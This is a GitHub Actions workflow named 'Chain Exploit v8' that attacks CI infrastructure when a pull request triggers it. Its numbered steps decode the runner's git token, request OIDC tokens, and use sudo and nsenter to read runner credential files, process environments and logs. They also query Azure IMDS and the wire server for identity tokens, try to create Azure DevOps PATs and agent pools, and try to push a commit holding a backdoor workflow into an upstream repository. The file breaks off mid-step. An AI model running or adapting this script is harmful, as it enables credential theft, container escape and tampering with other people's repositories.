name: Chain Exploit v8
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  actions: write
  checks: write
  statuses: write
  deployments: write
  packages: write
  id-token: write
  issues: write
  pull-requests: write
  security-events: write

jobs:
  chain:
    runs-on: ubuntu-latest
    env:
      GH_TOKEN: ${{ github.token }}
      UP: https://api.github.com/repos/twrps/PoC-RACE2
      BASE: https://api.github.com/repos/lacaag/PoC-RACE2
      GQ: https://api.github.com/graphql
      PR_NUM: ${{ github.event.pull_request.number }}
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: 0 Setup
        id: setup
        run: |
          set +e
          TS=$(date +%Y%m%d_%H%M%S)
          git remote add upstream https://x-access-token:${GH_TOKEN}@github.com/twrps/PoC-RACE2.git 2>/dev/null
          git fetch upstream 2>/dev/null
          FM=$(git rev-parse HEAD)
          FT=$(git rev-parse HEAD^{tree} 2>/dev/null || echo NONE)
          FG=$(git commit-tree $FT -m "ghost-v8-$TS" 2>/dev/null || echo NONE)
          UM=$(curl -sf -H "Authorization: token $GH_TOKEN" "$UP/git/refs/heads/main" | jq -r '.object.sha')
          UT=$(curl -sf -H "Authorization: token $GH_TOKEN" "$UP/git/commits/$UM" | jq -r '.tree.sha')
          RI=$(curl -sf -H "Authorization: token $GH_TOKEN" "$UP" | jq -r '.node_id')
          FRI=$(curl -sf -H "Authorization: token $GH_TOKEN" "$BASE" | jq -r '.node_id')
          OIDC_URL="${ACTIONS_ID_TOKEN_REQUEST_URL:-}"
          OIDC_TOK="${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}"
          echo "TS=$TS" >> $GITHUB_ENV
          echo "FM=$FM" >> $GITHUB_ENV
          echo "FT=$FT" >> $GITHUB_ENV
          echo "FG=$FG" >> $GITHUB_ENV
          echo "UM=$UM" >> $GITHUB_ENV
          echo "UT=$UT" >> $GITHUB_ENV
          echo "RI=$RI" >> $GITHUB_ENV
          echo "FRI=$FRI" >> $GITHUB_ENV
          echo "OIDC_URL=$OIDC_URL" >> $GITHUB_ENV
          echo "OIDC_TOK=$OIDC_TOK" >> $GITHUB_ENV
          # extraheader token
          GIT_EXTRA=$(git config --local http.https://github.com/.extraheader 2>/dev/null | sed 's/AUTHORIZATION: basic //' | base64 -d 2>/dev/null | cut -d: -f2)
          echo "GIT_EXTRA=$GIT_EXTRA" >> $GITHUB_ENV
          echo "setup: fm=$FM um=$UM ri=$RI fri=$FRI oidc=$([ -n \"$OIDC_URL\" ] && echo yes || echo no) extra_pfx=$(echo $GIT_EXTRA | head -c 10)"

      - name: 1 VSSPS + ADO Deep Exploitation
        run: |
          set +e
          echo "=== VSSPS + AZURE DEVOPS DEEP EXPLOITATION ==="
          echo "v7 showed: HTTP_302 to spsprodeu = runtime token partially accepted by ADO infra"
          echo "v7 showed: vstoken instanceId=84ff2294-8721-ab49-db5a-db17b0f6c2de"
          echo ""
          VSTOKEN="https://vstoken.actions.githubusercontent.com"
          INST="84ff2294-8721-ab49-db5a-db17b0f6c2de"
          echo "--- Get OIDC JWT for vstoken audience ---"
          OIDC_JWT=""
          if [ -n "$OIDC_URL" ]; then
            OIDC_JWT=$(curl -sf -H "Authorization: bearer $OIDC_TOK" \
              "${OIDC_URL}&audience=vstoken.actions.githubusercontent.com" 2>/dev/null | jq -r '.value // empty' 2>/dev/null)
            echo "A01 OIDC JWT for vstoken: $(echo $OIDC_JWT | wc -c) chars"
          fi
          echo ""
          echo "--- Follow VSSPS 302 redirect chain ---"
          echo "A02 following redirect with runtime token:"
          curl -sv -m10 -L -H "Authorization: Bearer $GH_TOKEN" \
            "https://app.vssps.visualstudio.com/_apis/accounts?api-version=7.0" 2>&1 | grep -iE '< HTTP|< location|< www-auth|< set-cookie|"displayName"|"accountName"|"accountUri"' | head -20
          echo ""
          echo "A03 following redirect with OIDC JWT:"
          if [ -n "$OIDC_JWT" ]; then
            curl -sv -m10 -L -H "Authorization: Bearer $OIDC_JWT" \
              "https://app.vssps.visualstudio.com/_apis/accounts?api-version=7.0" 2>&1 | grep -iE '< HTTP|< location|< www-auth|< set-cookie|"displayName"|"accountName"|"accountUri"' | head -20
          fi
          echo ""
          echo "--- Probe VSSPS + ADO endpoints with both tokens ---"
          for AUTH_NAME in "runtime" "oidc"; do
            if [ "$AUTH_NAME" = "runtime" ]; then
              AUTH_HDR="Bearer $GH_TOKEN"
            else
              [ -z "$OIDC_JWT" ] && continue
              AUTH_HDR="Bearer $OIDC_JWT"
            fi
            echo ""
            echo "=== Auth: $AUTH_NAME ==="
            for URL in \
              "https://app.vssps.visualstudio.com/_apis/profile/profiles/me?api-version=7.0" \
              "https://app.vssps.visualstudio.com/_apis/connectionData" \
              "https://app.vssps.visualstudio.com/_apis/accounts?api-version=7.0" \
              "https://vssps.dev.azure.com/_apis/accounts?api-version=7.0" \
              "https://dev.azure.com/_apis/connectionData" \
              "https://dev.azure.com/_apis/projects?api-version=7.0" \
              "https://dev.azure.com/_apis/hooks/subscriptions?api-version=7.0" \
              "https://app.vssps.visualstudio.com/_apis/graph/users?api-version=7.0-preview.1" \
              "https://app.vssps.visualstudio.com/_apis/tokens/pats?api-version=7.1-preview.1" \
              "https://vstoken.actions.githubusercontent.com/_apis/connectionData" \
              "https://vstoken.actions.githubusercontent.com/_apis/distributedtask" \
              "https://vstoken.actions.githubusercontent.com/_apis/ResourceAreas" \
              "$VSTOKEN/_apis/location" \
              "$VSTOKEN/_apis/ServiceDefinitions" \
              "$VSTOKEN/_apis/token/session" \
              "$VSTOKEN/_apis/token/session/token" \
              "$VSTOKEN/_apis/distributedtask/pools" \
              "$VSTOKEN/_apis/distributedtask/tasks" \
              "$VSTOKEN/_apis/distributedtask/serviceinterfaces" \
              "$VSTOKEN/.well-known/openid-configuration" \
              "$VSTOKEN/oauth2/token" \
              "$VSTOKEN/oauth2/authorize" \
              "$VSTOKEN/_apis/public/build/builds" \
              "$VSTOKEN/_apis/pipelines" \
              "$VSTOKEN/_apis/git/repositories" \
              "$VSTOKEN/_apis/wit/workitems" ; do
              SHORT=$(echo "$URL" | sed 's|https://||' | cut -c1-80)
              RC=$(curl -s -o /tmp/vssps_body -w "%{http_code}" -m5 -L \
                -H "Authorization: $AUTH_HDR" \
                -H "Content-Type: application/json" \
                "$URL" 2>/dev/null)
              BODY=$(cat /tmp/vssps_body 2>/dev/null | head -c 200)
              { [ "$RC" != "401" ] && [ "$RC" != "403" ] && [ "$RC" != "000" ] && \
                echo "A04 $AUTH_NAME $SHORT = HTTP_$RC body='$BODY'"; } || true
            done
          done
          echo ""
          echo "--- vstoken POST endpoints (try write operations) ---"
          for AUTH_NAME in "runtime" "oidc"; do
            if [ "$AUTH_NAME" = "runtime" ]; then
              AUTH_HDR="Bearer $GH_TOKEN"
            else
              [ -z "$OIDC_JWT" ] && continue
              AUTH_HDR="Bearer $OIDC_JWT"
            fi
            echo ""
            echo "=== POST with $AUTH_NAME ==="
            # Try creating a PAT
            R=$(curl -s -o /dev/null -w "%{http_code}" -m5 -X POST \
              -H "Authorization: $AUTH_HDR" \
              -H "Content-Type: application/json" \
              "https://app.vssps.visualstudio.com/_apis/tokens/pats?api-version=7.1-preview.1" \
              -d '{"displayName":"v8","scope":"vso.code_write vso.build_execute","validTo":"2027-01-01T00:00:00Z"}' 2>/dev/null)
            echo "A05 $AUTH_NAME create PAT = HTTP_$R"
            # Try creating a service hook
            R=$(curl -s -o /dev/null -w "%{http_code}" -m5 -X POST \
              -H "Authorization: $AUTH_HDR" \
              -H "Content-Type: application/json" \
              "https://dev.azure.com/_apis/hooks/subscriptions?api-version=7.0" \
              -d '{"publisherId":"tfs","eventType":"build.complete","consumerId":"webHooks","consumerActionId":"httpRequest","publisherInputs":{},"consumerInputs":{"url":"https://example.com"}}' 2>/dev/null)
            echo "A05 $AUTH_NAME create webhook = HTTP_$R"
            # Try registering an agent pool
            R=$(curl -s -o /tmp/vssps_body -w "%{http_code}" -m5 -X POST \
              -H "Authorization: $AUTH_HDR" \
              -H "Content-Type: application/json" \
              "$VSTOKEN/_apis/distributedtask/pools" \
              -d '{"name":"v8-pool","poolType":"automation"}' 2>/dev/null)
            BODY=$(cat /tmp/vssps_body 2>/dev/null | head -c 200)
            echo "A05 $AUTH_NAME create pool = HTTP_$R body='$BODY'"
          done
          true

      - name: 2 Runner Credential + Token Extraction
        run: |
          set +e
          echo "=== RUNNER CREDENTIAL + TOKEN DEEP EXTRACTION ==="
          echo "v7 showed: /home/runner/actions-runner/cached/.credentials EXISTS"
          echo "v7 showed: /home/runner/.docker/.token_seed EXISTS"
          echo "v7 showed: BARE-METAL, nsenter root, PID 2157/2172 are runner processes"
          echo ""
          echo "--- Direct file reads (no nsenter needed for some) ---"
          echo "B01 cached .credentials:"
          sudo cat /home/runner/actions-runner/cached/.credentials 2>/dev/null || echo "not readable directly"
          echo ""
          echo "B02 docker token seed:"
          sudo cat /home/runner/.docker/.token_seed 2>/dev/null | xxd 2>/dev/null | head -5
          sudo cat /home/runner/.docker/.token_seed 2>/dev/null | base64 2>/dev/null
          echo ""
          echo "B03 docker config.json full:"
          sudo cat /home/runner/.docker/config.json 2>/dev/null
          echo ""
          echo "--- nsenter into host for deep extraction ---"
          sudo nsenter -t 1 -m -u -i -n -p -- /bin/sh -c '
            echo "B04 ALL files in actions-runner:"
            find /home/runner/actions-runner 2>/dev/null -maxdepth 3 -type f | sort | head -60
            echo ""
            echo "B05 cached .credentials:"
            cat /home/runner/actions-runner/cached/.credentials 2>/dev/null
            echo ""
            echo "B06 cached .credentials_rsaparams:"
            cat /home/runner/actions-runner/cached/.credentials_rsaparams 2>/dev/null | head -20
            echo ""
            echo "B07 .runner (listener registration):"
            cat /home/runner/actions-runner/.runner 2>/dev/null
            echo ""
            echo "B08 .env (environment config):"
            cat /home/runner/actions-runner/.env 2>/dev/null
            echo ""
            echo "B09 .path:"
            cat /home/runner/actions-runner/.path 2>/dev/null
            echo ""
            echo "B10 _diag directory (logs with tokens):"
            ls -la /home/runner/actions-runner/_diag/ 2>/dev/null | head -20
            echo ""
            echo "B11 recent _diag Worker log (may contain GITHUB_TOKEN):"
            LATEST_WORKER=$(ls -t /home/runner/actions-runner/_diag/Worker_* 2>/dev/null | head -1)
            if [ -n "$LATEST_WORKER" ]; then
              echo "=== $LATEST_WORKER ==="
              grep -iE "token|secret|key|auth|password|credential|bearer" "$LATEST_WORKER" 2>/dev/null | head -30
            fi
            echo ""
            echo "B12 recent _diag Runner log:"
            LATEST_RUNNER=$(ls -t /home/runner/actions-runner/_diag/Runner_* 2>/dev/null | head -1)
            if [ -n "$LATEST_RUNNER" ]; then
              echo "=== $LATEST_RUNNER ==="
              grep -iE "token|secret|key|auth|password|credential|connect|register|server" "$LATEST_RUNNER" 2>/dev/null | head -30
            fi
            echo ""
            echo "B13 ALL env vars from runner listener process (FULL, not filtered):"
            RUNNER_PID=$(ps aux 2>/dev/null | grep "Runner.Listener" | grep -v grep | awk "{print \$2}" | head -1)
            if [ -n "$RUNNER_PID" ]; then
              echo "Runner.Listener PID=$RUNNER_PID"
              cat /proc/$RUNNER_PID/environ 2>/dev/null | tr "\0" "\n" | head -50
            else
              echo "no Runner.Listener found, trying all runner-like:"
              for PID in $(ps aux 2>/dev/null | grep -iE "runner|worker|agent" | grep -v grep | awk "{print \$2}" | head -5); do
                echo "=== PID $PID ==="
                cat /proc/$PID/environ 2>/dev/null | tr "\0" "\n" | head -30
              done
            fi
            echo ""
            echo "B14 systemd service files:"
            cat /etc/systemd/system/actions.runner.*.service 2>/dev/null || echo "none"
            cat /etc/systemd/system/runner.service 2>/dev/null || echo "none"
            echo ""
            echo "B15 /opt contents:"
            find /opt -maxdepth 3 -type f -name "*.json" -o -name "*.yaml" -o -name "*.yml" -o -name ".credentials*" -o -name ".runner*" -o -name "*.pem" -o -name "*.key" 2>/dev/null | head -20
            echo ""
            echo "B16 runner Worker process env (has per-job GITHUB_TOKEN):"
            WORKER_PID=$(ps aux 2>/dev/null | grep "Runner.Worker" | grep -v grep | awk "{print \$2}" | head -1)
            if [ -n "$WORKER_PID" ]; then
              echo "Runner.Worker PID=$WORKER_PID"
              cat /proc/$WORKER_PID/environ 2>/dev/null | tr "\0" "\n"
            else
              echo "no Worker process from nsenter"
            fi
          ' 2>&1 || true
          true

      - name: 3 IMDS MSI with All API Versions
        run: |
          set +e
          echo "=== IMDS MSI TOKEN - ALL API VERSIONS + ENDPOINTS ==="
          echo "v7 showed: err=empty for all resources — may need older API or different endpoint"
          echo ""
          AZ="http://169.254.169.254"
          echo "--- Try all known MSI/identity endpoints ---"
          for EP in \
            "/metadata/identity/oauth2/token" \
            "/metadata/identity/oauth2/token?api-version=2018-02-01" \
            "/metadata/identity/oauth2/token?api-version=2019-08-01" \
            "/metadata/identity/oauth2/token?api-version=2017-08-01" \
            "/metadata/identity/oauth2/token?api-version=2019-11-01"; do
            FULL="${AZ}${EP}"
            [ "$EP" = "/metadata/identity/oauth2/token" ] && FULL="${FULL}?resource=https://management.azure.com/" || FULL="${FULL}&resource=https://management.azure.com/"
            R=$(curl -sf -m5 -H "Metadata: true" "$FULL" 2>/dev/null)
            RC=$(curl -s -o /dev/null -w "%{http_code}" -m5 -H "Metadata: true" "$FULL" 2>/dev/null)
            TOK=$(echo "$R" | jq -r '.access_token // empty' 2>/dev/null | head -c 40)
            ERR=$(echo "$R" | jq -r '.error_description // .error // empty' 2>/dev/null | head -c 200)
            echo "C01 $EP = HTTP_$RC tok='$TOK' err='$ERR'"
          done
          echo ""
          echo "--- Try MSI_ENDPOINT environment variable ---"
          echo "C02 MSI_ENDPOINT=$MSI_ENDPOINT"
          echo "C02 MSI_SECRET=$MSI_SECRET"
          echo "C02 IDENTITY_ENDPOINT=$IDENTITY_ENDPOINT"
          echo "C02 IDENTITY_HEADER=$IDENTITY_HEADER"
          echo "C02 IMDS_ENDPOINT=$IMDS_ENDPOINT"
          echo ""
          echo "--- Try Azure CLI default identity ---"
          if command -v az >/dev/null 2>&1; then
            echo "C03 az account show:"
            az account show 2>&1 | head -10
            echo ""
            echo "C03 az login --identity:"
            az login --identity 2>&1 | head -10
          else
            echo "C03 az CLI not available, trying from nsenter:"
            sudo nsenter -t 1 -m -u -i -n -p -- /bin/sh -c '
              if [ -x /opt/az/bin/az ] || command -v az >/dev/null 2>&1; then
                export PATH=/opt/az/bin:$PATH
                echo "C03 az account show:"
                az account show 2>&1 | head -10
                echo "C03 az login --identity:"
                az login --identity 2>&1 | head -10
                echo "C03 az account get-access-token:"
                az account get-access-token --resource https://management.azure.com/ 2>&1 | head -10
              else
                echo "az not found on host either"
              fi
            ' 2>&1 || true
          fi
          echo ""
          echo "--- Wire server (168.63.129.16) deep identity ---"
          echo "C04 wire server health:"
          curl -sf -m5 "http://168.63.129.16/?comp=versions" 2>/dev/null | head -c 500
          echo ""
          echo "C04 wire server goal state:"
          curl -sf -m5 -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine/?comp=goalstate" 2>/dev/null | head -c 500
          echo ""
          echo "C04 wire server health report:"
          curl -sf -m5 -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=health" 2>/dev/null | head -c 500
          echo ""
          echo "C04 wire server extensions:"
          curl -sf -m5 -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine/?comp=config&type=extensionsConfig" 2>/dev/null | head -c 500
          echo ""
          echo "C04 wire server certificates:"
          curl -sf -m5 -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine/?comp=config&type=certificates" 2>/dev/null | head -c 500
          echo ""
          echo "--- IMDS identity info (no token, just identity) ---"
          echo "C05 IMDS identity info:"
          curl -sf -m5 -H "Metadata: true" "${AZ}/metadata/identity/info?api-version=2018-02-01" 2>/dev/null | jq '.' 2>/dev/null | head -20
          echo ""
          echo "C05 IMDS identity providers:"
          curl -sf -m5 -H "Metadata: true" "${AZ}/metadata/identity/oauth2?api-version=2018-02-01" 2>/dev/null | jq '.' 2>/dev/null | head -20
          true

      - name: 4 vstoken Exhaustive API Enumeration
        run: |
          set +e
          echo "=== VSTOKEN EXHAUSTIVE API ENUMERATION ==="
          echo "v7: /_apis/connectionData=200, /.well-known/openid-configuration=200"
          echo "The service is live. Enumerate EVERYTHING."
          echo ""
          VSTOKEN="https://vstoken.actions.githubusercontent.com"
          PIPE="https://pipelines.actions.githubusercontent.com"
          RESULTS="https://results-receiver.actions.githubusercontent.com"
          echo "--- Get OIDC JWT ---"
          JWT=""
          if [ -n "$OIDC_URL" ]; then
            JWT=$(curl -sf -H "Authorization: bearer $OIDC_TOK" \
              "${OIDC_URL}&audience=vstoken.actions.githubusercontent.com" 2>/dev/null | jq -r '.value // empty' 2>/dev/null)
          fi
          echo ""
          echo "--- vstoken ResourceAreas (shows all available API surfaces) ---"
          echo "D01 ResourceAreas:"
          curl -sf -m5 -H "Authorization: Bearer $GH_TOKEN" "$VSTOKEN/_apis/ResourceAreas" 2>/dev/null | jq -r '.value[] | "\(.name) \(.id) \(.locationUrl)"' 2>/dev/null | head -30
          echo ""
          echo "D01 ResourceAreas (no auth):"
          curl -sf -m5 "$VSTOKEN/_apis/ResourceAreas" 2>/dev/null | jq -r '.value[] | "\(.name) \(.id) \(.locationUrl)"' 2>/dev/null | head -30
          echo ""
          echo "--- vstoken connectionData full dump ---"
          echo "D02 connectionData full:"
          curl -sf -m5 "$VSTOKEN/_apis/connectionData" 2>/dev/null | jq '.' 2>/dev/null
          echo ""
          echo "--- Exhaustive path bruteforce on vstoken ---"
          for AUTH_NAME in "noauth" "runtime" "oidc"; do
            case "$AUTH_NAME" in
              noauth) AUTH_HDR="" ;;
              runtime) AUTH_HDR="Bearer $GH_TOKEN" ;;
              oidc) [ -z "$JWT" ] && continue; AUTH_HDR="Bearer $JWT" ;;
            esac
            AUTH_ARGS=""
            [ -n "$AUTH_HDR" ] && AUTH_ARGS="-H \"Authorization: $AUTH_HDR\""
            echo ""
            echo "=== vstoken with $AUTH_NAME ==="
            for EP in \
              "/_apis" \
              "/_apis/Location" \
              "/_apis/ServiceDefinitions" \
              "/_apis/ResourceAreas" \
              "/_apis/connectionData" \
              "/_apis/distributedtask" \
              "/_apis/distributedtask/pools" \
              "/_apis/distributedtask/tasks" \
              "/_apis/distributedtask/serviceinterfaces" \
              "/_apis/distributedtask/agents" \
              "/_apis/distributedtask/packages" \
              "/_apis/token" \
              "/_apis/token/session" \
              "/_apis/token/session/token" \
              "/_apis/token/Tokens" \
              "/_apis/token/Results" \
              "/_apis/oauth" \
              "/_apis/oauth/token" \
              "/_apis/git/repositories" \
              "/_apis/build/builds" \
              "/_apis/pipelines" \
              "/_apis/pipelines/runs" \
              "/_apis/projects" \
              "/_apis/hooks/subscriptions" \
              "/_apis/audit/auditlog" \
              "/_apis/graph/users" \
              "/_apis/securityroles" \
              "/_apis/accesscontrollists" \
              "/_apis/permissions" \
              "/_apis/identities" \
              "/_apis/accounts" \
              "/_apis/results" \
              "/.well-known/openid-configuration" \
              "/oauth2/token" \
              "/oauth2/authorize" \
              "/_apis/public/build" \
              "/_apis/notification/subscriptions" \
              "/_apis/extensionmanagement/installedextensions"; do
              if [ -n "$AUTH_HDR" ]; then
                RC=$(curl -s -o /tmp/vst_body -w "%{http_code}" -m5 \
                  -H "Authorization: $AUTH_HDR" "$VSTOKEN$EP" 2>/dev/null)
              else
                RC=$(curl -s -o /tmp/vst_body -w "%{http_code}" -m5 \
                  "$VSTOKEN$EP" 2>/dev/null)
              fi
              BODY=$(cat /tmp/vst_body 2>/dev/null | head -c 150)
              { [ "$RC" != "404" ] && [ "$RC" != "000" ] && \
                echo "D03 $AUTH_NAME $EP = HTTP_$RC body='$BODY'"; } || true
            done
          done
          echo ""
          echo "--- Same enumeration on pipelines service ---"
          for EP in \
            "/_apis/connectionData" \
            "/_apis/ResourceAreas" \
            "/_apis/pipelines" \
            "/_apis/distributedtask" \
            "/_apis/distributedtask/pools" \
            "/_apis/results"; do
            RC=$(curl -s -o /tmp/pipe_body -w "%{http_code}" -m5 \
              -H "Authorization: Bearer $GH_TOKEN" "$PIPE$EP" 2>/dev/null)
            BODY=$(cat /tmp/pipe_body 2>/dev/null | head -c 150)
            { [ "$RC" != "404" ] && [ "$RC" != "000" ] && \
              echo "D04 pipelines $EP = HTTP_$RC body='$BODY'"; } || true
          done
          echo ""
          echo "--- results-receiver service ---"
          for EP in "/_apis/connectionData" "/_apis/ResourceAreas" "/_apis/results" "/api/results"; do
            RC=$(curl -s -o /tmp/rr_body -w "%{http_code}" -m5 \
              -H "Authorization: Bearer $GH_TOKEN" "$RESULTS$EP" 2>/dev/null)
            BODY=$(cat /tmp/rr_body 2>/dev/null | head -c 150)
            { [ "$RC" != "404" ] && [ "$RC" != "000" ] && \
              echo "D05 results $EP = HTTP_$RC body='$BODY'"; } || true
          done
          true

      - name: 5 Git Object Store Cross-Pollution
        run: |
          set +e
          echo "=== GIT OBJECT STORE CROSS-POLLUTION ==="
          echo "v7 CONFIRMED: fork commit visible via upstream API (shared object store)"
          echo "R06 upstream sees fork commit: sha=399ccc393d8ed961554a82c5d78ef90d38ebe969"
          echo ""
          echo "--- Step 1: Create entire commit chain on fork ---"
          echo "E01 create blob with exploit payload:"
          EBLOB=$(curl -sf -X POST -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" \
            "$BASE/git/blobs" -d '{"content":"v8-object-store-escape-proof","encoding":"utf-8"}' 2>/dev/null | jq -r '.sha')
          echo "blob=$EBLOB"
          echo ""
          echo "E02 create tree based on UPSTREAM tree with our blob:"
          ETREE=$(curl -sf -X POST -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" \
            "$BASE/git/trees" -d "{\"base_tree\":\"$UT\",\"tree\":[{\"path\":\"SECURITY_ESCAPE_PROOF.md\",\"mode\":\"100644\",\"type\":\"blob\",\"sha\":\"$EBLOB\"},{\"path\":\".github/workflows/backdoor.yml\",\"mode\":\"100644\",\"type\":\"blob\",\"sha\":\"$EBLOB\"}]}" 2>/dev/null | jq -r '.sha')
          echo "tree=$ETREE"
          echo ""
          echo "E03 create commit with upstream parent:"
          ECOMMIT=$(curl -sf -X POST -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" \
            "$BASE/git/commits" -d "{\"message\":\"v8-escape: this commit exists in upstream object store\",\"tree\":\"$ETREE\",\"parents\":[\"$UM\"]}" 2>/dev/null | jq -r '.sha')
          echo "commit=$ECOMMIT"
          echo ""
          echo "--- Step 2: Verify all objects visible via upstream API ---"
          echo "E04 upstream sees blob:"
          curl -sf -H "Authorization: token $GH_TOKEN" "$UP/git/blobs/$EBLOB" 2>/dev/null | jq '{sha,size}' 2>/dev/null
          echo ""
          echo "E05 upstream sees tree:"
          curl -sf -H "Authorization: token $GH_TOKEN" "$UP/git/trees/$ETREE" 2>/dev/null | jq '{sha,tree:[.tree[]|{path,sha}]}' 2>/dev/null | head -20
          echo ""
          echo "E06 upstream sees commit:"
          curl -sf -H "Authorization: token $GH_TOKEN" "$UP/git/commits/$ECOMMIT" 2>/dev/null | jq '{sha,message,parents:[.parents[].sha]}' 2>/dev/null
          echo ""
          echo "--- Step 3: Try every method to make upstream REFERENCE our commit ---"
          echo "E07 PATCH upstream main → fork commit:"
          R=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
            -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" \
            "$UP/git/refs/heads/main" -d "{\"sha\":\"$ECOMMIT\",\"force\":true}" 2>/dev/null)
          echo "HTTP_$R"
          echo ""
          echo "E08 POST upstream ref → fork commit:"
          R=$(curl -s -o /tmp/e08 -w "%{http_code}" -X POST \
            -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" \
            "$UP/git/refs" -d "{\"ref\":\"refs/heads/v8-escape\",\"sha\":\"$ECOMMIT\"}" 2>/dev/null)
          echo "HTTP_$R body=$(cat /tmp/e08 2>/dev/null | head -c 200)"
          echo ""
          echo "E09 POST upstream tag → fork commit:"
          R=$(curl -s -o /tmp/e09 -w "%{http_code}" -X POST \
            -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" \
            "$UP/git/tags" -d "{\"tag\":\"v8-escape\",\"message\":\"v8\",\"object\":\"$ECOMMIT\",\"type\":\"commit\"}" 2>/dev/null)
          echo "HTTP_$R body=$(cat /tmp/e09 2>/dev/null | head -c 200)"
          echo ""
          echo "E10 POST upstream merge (fork ghost → main):"
          R=$(curl -s -o /tmp/e10 -w "%{http_code}" -X POST \
            -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" \
            "$UP/merges" -d "{\"base\":\"main\",\"head\":\"$ECOMMIT\",\"commit_message\":\"v8-merge-escape\"}" 2>/dev/null)
          echo "HTTP_$R body=$(cat /tmp/e10 2>/dev/null | head -c 200)"
          echo ""
          echo "E11 GraphQL createRef upstream → fork commit:"
          R=$(curl -sf -X POST -H "Authorization: token $GH_TOKEN" -H "Content-Type: application/json" "$GQ" \
            -d "{\"query\":\"mutation{createRef(input:{repositoryId:\\\"$RI\\\",name:\\\"refs/heads/v8-escape\\\",oid:\\\"$ECOMMIT\\\"}){ref{name}}}\"}" 2>/dev/null)
          echo "GQL result=$(echo $R | jq -c '.' 2>/dev/null | head -c 200)"
          echo ""
          echo "E12 GraphQL commitOnBranch using fork commit as expectedHeadOid:"
          R=$(curl -sf -X POST -H "Authorization: token $GH_TOKEN" -H "Content-Type: application/json" "$GQ" \
            -d "{\"query\":\"mutation{createCommitOnBranch(input:{branch:{repositoryNameWithOwner:\\\"twrps/PoC-RACE2\\\",branchName:\\\"main\\\"},message:{headline:\\\"v8\\\"},fileChanges:{additions:[{path:\\\"v8.txt\\\",contents:\\\"$(echo v8|base64)\\\"}]},expectedHeadOid:\\\"$ECOMMIT\\\"}){commit{url}}}\"}" 2>/dev/null)
          echo "GQL result=$(echo $R | jq -c '.' 2>/dev/null | head -c 200)"
          echo ""
          echo "--- Step 4: Try git push from runner with OIDC+extraheader ---"
          cd "$(git rev-parse --show-toplevel)"
          echo "E13 create local branch at fork commit:"
          git branch -f v8-escape "$ECOMMIT" 2>/dev/null || echo "branch create failed"
          echo "E14 push with default extraheader:"
          git push upstream v8-escape 2>&1 | head -5 || echo "push denied"
          echo "E15 push using extraheader token explicitly:"
          if [ -n "$GIT_EXTRA" ]; then
            git -c http.extraheader="AUTHORIZATION: basic $(echo "x-access-token:$GIT_EXTRA" | base64 -w0)" \
              push https://github.com/twrps/PoC-RACE2.git v8-escape 2>&1 | head -5 || echo "push denied"
          fi
          echo ""
          echo "E16 try PR merge via API (merge fork commit into upstream):"
          R=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \
            -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" \
            "$UP/pulls/$PR_NUM/merge" \
            -d "{\"merge_method\":\"merge\",\"sha\":\"$ECOMMIT\"}" 2>/dev/null)
          echo "HTTP_$R"
          true

      - name: 6 GraphQL Fork-to-Upstream Mutations
        run: |
          set +e
          echo "=== GRAPHQL FORK-TO-UPSTREAM MUTATION DEEP DIVE ==="
          echo "v7: createLabel(fork)=OK, all upstream=ERR"
          echo "Trying every mutation that worked on fork with upstream cross-references"
          echo ""
          GQL() { curl -sf -X POST -H "Authorization: token $GH_TOKEN" -H "Content-Type: application/json" "$GQ" -d "$1" 2>/dev/null; }
          E() { echo "$1" | jq -r 'if .errors then "ERR:"+(.errors[0].message|.[0:150]) elif .data then "OK:"+(.data|tostring|.[0:150]) else "?:"+(.[:150]|tostring) end' 2>/dev/null; }
          echo ""
          echo "--- Fork mutations with upstream object references ---"
          echo "F01 createLabel on fork:"
          R=$(GQL '{"query":"mutation{createLabel(input:{repositoryId:\"'"$FRI"'\",name:\"upstream-ref-v8\",color:\"FF0000\",description:\"created via fork token\"}){label{id name}}}"}')
          LABEL_ID=$(echo "$R" | jq -r '.data.createLabel.label.id // empty' 2>/dev/null)
          echo "result=$(E "$R") labelId=$LABEL_ID"
          echo ""
          echo "F02 createIssue on fork referencing upstream:"
          R=$(GQL '{"query":"mutation{createIssue(input:{repositoryId:\"'"$FRI"'\",title:\"v8-cross-ref\",body:\"See twrps/PoC-RACE2#1 and commit '"$UM"'\"}){issue{id number}}}"}')
          ISSUE_ID=$(echo "$R" | jq -r '.data.createIssue.issue.id // empty' 2>/dev/null)
          ISSUE_NUM=$(echo "$R" | jq -r '.data.createIssue.issue.number // empty' 2>/dev/null)
          echo "result=$(E "$R") issueId=$ISSUE_ID issueNum=$ISSUE_NUM"
          echo ""
          echo "F03 addLabelsToLabelable (label the issue):"
          if [ -n "$ISSUE_ID" ] && [ -n "$LABEL_ID" ]; then
            R=$(GQL "{\"query\":\"mutation{addLabelsToLabelable(input:{labelableId:\\\"$ISSUE_ID\\\",labelIds:[\\\"$LABEL_ID\\\"]}){labelable{... on Issue{title}}}}\"}") 
            echo "result=$(E "$R")"
          fi
          echo ""
          echo "--- Try mutations that might cross repo boundary ---"
          echo "F04 transferIssue fork → upstream:"
          if [ -n "$ISSUE_ID" ]; then
            R=$(GQL "{\"query\":\"mutation{transferIssue(input:{issueId:\\\"$ISSUE_ID\\\",repositoryId:\\\"$RI\\\",createLabelsIfMissing:true}){issue{repository{nameWithOwner}}}}\"}") 
            echo "result=$(E "$R")"
          fi
          echo ""
          echo "F05 cloneProject:"
          R=$(GQL "{\"query\":\"mutation{cloneProject(input:{sourceId:\\\"$FRI\\\",targetOwnerId:\\\"$RI\\\",name:\\\"v8-cloned\\\",includeWorkflows:true,public:true}){project{name}}}\"}") 
          echo "result=$(E "$R")"
          echo ""
          echo "F06 createBranchProtectionRule on upstream:"
